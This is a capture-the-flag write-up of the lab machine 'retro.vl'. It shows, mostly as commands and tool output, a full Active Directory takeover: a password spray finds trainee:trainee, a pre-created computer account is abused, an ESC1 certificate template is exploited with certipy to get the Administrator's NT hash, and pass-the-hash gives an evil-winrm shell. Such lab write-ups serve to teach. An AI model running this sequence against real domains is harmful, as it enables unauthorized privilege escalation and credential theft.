# Enumeration
## Open ports
```python
nmap -p- --min-rate=3000 retro.vl                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 23:10 +0000
Nmap scan report for retro.vl (10.129.234.44)
Host is up (0.060s latency).
rDNS record for 10.129.234.44: DC.retro.vl
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
51472/tcp open  unknown
51491/tcp open  unknown
51506/tcp open  unknown
59271/tcp open  unknown
65350/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 88.65 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389 -A --min-rate=3000 retro.vl
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 23:13 +0000
Nmap scan report for retro.vl (10.129.234.44)
Host is up (0.025s latency).
rDNS record for 10.129.234.44: DC.retro.vl

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-07 23:13:10Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-03-07T22:57:37
|_Not valid after:  2027-03-07T22:57:37

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-03-07T22:57:37
|_Not valid after:  2027-03-07T22:57:37
|_ssl-date: TLS randomness does not represent time

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-03-07T22:57:37
|_Not valid after:  2027-03-07T22:57:37

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-03-07T22:57:37
|_Not valid after:  2027-03-07T22:57:37
|_ssl-date: TLS randomness does not represent time

3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-03-07T23:13:54+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-03-06T23:06:46
|_Not valid after:  2026-09-05T23:06:46
|_ssl-date: 2026-03-07T23:14:34+00:00; 0s from scanner time.

9389/tcp open  mc-nmf        .NET Message Framing

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
# SMB (445)
Null authentication doesnt give me anything
## Guest access
### Shares
```python
nxc smb DC.retro.vl -u 'Guest' -p '' --shares   
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ
```
I have read access on the `trainees` share
### Users
```python
nxc smb DC.retro.vl -u 'Guest' -p '' --rid-brute
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```
From this list ill make a userlist
AS-REP roasting failed

# `Trainees` share
```python
smbclient \\\\DC.retro.vl\\Trainees -U 'Guest'
Password for [WORKGROUP\Guest]:
Try "help" to get a list of possible commands.
smb: \> l
  .                                   D        0  Sun Jul 23 22:58:43 2023
  ..                                DHS        0  Wed Jun 11 15:17:10 2025
  Important.txt                       A      288  Sun Jul 23 23:00:13 2023

		4659711 blocks of size 4096. 1325482 blocks available
smb: \> get Important.txt 
getting file \Important.txt of size 288 as Important.txt (4.3 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> 
```
Ill have a read of this file
## `Important.txt`
```python
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```
We already know there is an account called `trainee` from out user dump
# Compromising `trainee`
```python
nxc ldap DC.retro.vl -u users.txt -p users.txt --continue-on-success
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:Administrator 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:Guest 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:krbtgt 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\trainee:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:DC$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:trainee 
LDAP        10.129.234.44   389    DC               [+] retro.vl\trainee:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:trainee 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:BANKING$ 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:jburley 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Administrator:tblack 
LDAP        10.129.234.44   389    DC               [-] retro.vl\Guest:tblack 
LDAP        10.129.234.44   389    DC               [-] retro.vl\krbtgt:tblack 
LDAP        10.129.234.44   389    DC               [-] retro.vl\DC$:tblack 
LDAP        10.129.234.44   389    DC               [-] retro.vl\BANKING$:tblack 
LDAP        10.129.234.44   389    DC               [-] retro.vl\jburley:tblack 
LDAP        10.129.234.44   389    DC               [-] retro.vl\tblack:tblack
```
From this output its clear to see that the `trainee` user has been compromised

```python
trainee:trainee
```
Now ill verify access

```python
nxc smb DC.retro.vl -u trainee -p 'trainee' --shares   
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ
```
I now have read access on the Notes share

# `Notes` share
```python
smbclient \\\\DC.retro.vl\\Notes -U 'trainee'%'trainee'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 04:12:49 2025
  ..                                DHS        0  Wed Jun 11 15:17:10 2025
  ToDo.txt                            A      248  Sun Jul 23 23:05:56 2023
  user.txt                            A       32  Wed Apr  9 04:13:01 2025

		4659711 blocks of size 4096. 1325230 blocks available
smb: \> mget *
Get file ToDo.txt? y
getting file \ToDo.txt of size 248 as ToDo.txt (3.4 KiloBytes/sec) (average 3.4 KiloBytes/sec)
Get file user.txt? y
getting file \user.txt of size 32 as user.txt (0.5 KiloBytes/sec) (average 2.0 KiloBytes/sec)
smb: \> 
```
Looks like ive found the user flag and also a another file which could be interesting

# `ToDo.txt`
```python
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```
Looks like they are hinting at pre created computer accounts, im going to take a guess its referring to `BANKING$`

# Compromising `BANKING$`
```python
nxc ldap DC.retro.vl -u trainee -p 'trainee' -M pre2k               
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.44   389    DC               [+] retro.vl\trainee:trainee 
PRE2K       10.129.234.44   389    DC               Pre-created computer account: BANKING$
PRE2K       10.129.234.44   389    DC               [+] Found 1 pre-created computer accounts. Saved to /home/ethan/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
PRE2K       10.129.234.44   389    DC               [+] Successfully obtained TGT for banking@retro.vl
PRE2K       10.129.234.44   389    DC               [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /home/ethan/.nxc/modules/pre2k/ccache
```
So ive identified the computer account, and its also saved a ccache for me

```python
mv /home/ethan/.nxc/modules/pre2k/ccache .

export KRB5CCNAME=ccache/banking.ccache
```
Now i can use this ticket to authenticate

```python
nxc smb DC.retro.vl -k --use-kcache                  
SMB         DC.retro.vl     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC.retro.vl     445    DC               [+] RETRO.VL\banking from ccache
```
Here i am verifying access
This user has no extra access over SMB

# ADCS exploitation
```python
certipy-ad find -k -no-pass -dc-ip 10.129.234.44 -dc-host DC.retro.vl -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260307234013_Certipy.txt'
[*] Wrote text output to '20260307234013_Certipy.txt'
[*] Saving JSON output to '20260307234013_Certipy.json'
[*] Wrote JSON output to '20260307234013_Certipy.json'
```
Now ill cat out the response

```python
cat 20260307234013_Certipy.txt                                                   
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
As seen here this is vulnerable to ESC1

## ESC1
```python
certipy-ad account -k -no-pass -dc-ip 10.129.234.44 -dc-host DC.retro.vl -user 'Administrator' read
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Reading attributes for 'Administrator':
    cn                                  : Administrator
    distinguishedName                   : CN=Administrator,CN=Users,DC=retro,DC=vl
    name                                : Administrator
    objectSid                           : S-1-5-21-2983547755-698260136-4283918172-500
    sAMAccountName                      : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2023-07-23T21:07:55+00:00
    whenChanged                         : 2025-05-05T07:11:09+00:00
```
I first of all run this command to get the Admins SID

```python
certipy-ad req -k -no-pass -dc-ip 10.129.234.44 -target 'DC.retro.vl' -dc-host 'DC.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096 -debug
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: RETRO.VL
[+] Username retrieved from CCache: banking
[+] Nameserver: '10.129.234.44'
[+] DC IP: '10.129.234.44'
[+] DC Host: 'DC.retro.vl'
[+] Target IP: None
[+] Remote Name: 'DC.retro.vl'
[+] Domain: 'RETRO.VL'
[+] Username: 'BANKING'
[+] Trying to resolve 'DC.retro.vl' at '10.129.234.44'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Checking for Kerberos ticket cache
[+] Loaded Kerberos cache from ccache/banking.ccache
[+] Using TGT from cache
[+] Username retrieved from CCache credential: banking
[+] Getting TGS for 'HOST/DC.retro.vl'
[+] Got TGS for 'HOST/DC.retro.vl'
[+] Trying to connect to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.234.44[\pipe\cert]
[*] Request ID is 15
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@retro.vl'
[+] Found SID in SAN URL: 'S-1-5-21-2983547755-698260136-4283918172-500'
[+] Found SID in security extension: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
I now have the administrators pfx file

```python
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.234.44                                        
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```
I now have the admins NTLM hash

# Domain admin
```python
evil-winrm -i retro.vl -u Administrator -H 252fac7066d93dd009d4fd2cd0368389
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
40fce9c3f09024bcab29d377ee1ed071
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
As seen from this output i was able to get a session and retrieve the root flag
Full domain compromise!